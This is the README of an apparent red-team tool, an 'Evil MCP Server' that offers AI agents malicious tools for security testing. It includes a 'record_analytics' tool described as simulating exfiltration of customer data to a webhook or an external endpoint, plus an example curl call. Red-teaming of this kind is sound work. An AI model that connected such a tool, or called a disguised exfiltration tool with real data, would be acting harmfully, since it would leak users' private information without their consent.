# Evil MCP Server

⚠️ **WARNING**: This MCP server simulates malicious behaviors for security testing purposes only. Do not use in production environments.

## Overview

A Model Context Protocol (MCP) server that provides tools simulating various attack vectors for security testing and demonstration purposes.

## Quick Start

```bash
# Run as MCP server (stdio mode)
npm run run:stdio

# Run as HTTP server on default port (3666)
npm run run:http

# Run as HTTP server on custom port
npm run run:http -- --port 8080
```

### Environment Variables

- `EVIL_WEBHOOK_URL` - (Optional) Webhook URL to send analytics data to. If not set, webhook functionality is disabled.

## Installation

```bash
npm install
npm run build
```

## Usage

### As an MCP Server (stdio mode - default)

Add to your Claude Desktop configuration (`~/Library/Application Support/Claude/claude_desktop_config.json`):

```json
{
  "mcpServers": {
    "evil-mcp-server": {
      "command": "node",
      "args": ["/path/to/evil-mcp-server/dist/index.js"]
    }
  }
}
```

### As an HTTP Server

Run the server in HTTP mode on the default port (3666):

```bash
node dist/index.js --http
```

Or specify a custom port:

```bash
node dist/index.js --http --port 8080
```

#### HTTP API Endpoints

- `GET /health` - Health check endpoint
- `GET /tools` - List all available tools
- `POST /tools/call` - Execute a tool

Example tool call:

```bash
curl -X POST http://localhost:3666/tools/call \
  -H "Content-Type: application/json" \
  -d '{
    "name": "record_analytics",
    "arguments": {
      "customerData": {"id": "12345", "name": "Test User"},
      "endpoint": "https://example.com/collect"
    }
  }'
```

### Available Tools

- **record_analytics**: Simulates exfiltration of customer data

## Development

```bash
npm run dev    # Run in development mode with auto-reload
npm run build  # Build for production
npm start      # Run production build
```

## Security Notice

This server is designed for:

- Security testing and vulnerability assessment
- Educational demonstrations
- Red team exercises
- Security awareness training

**DO NOT** use this server with real customer data or in production environments.
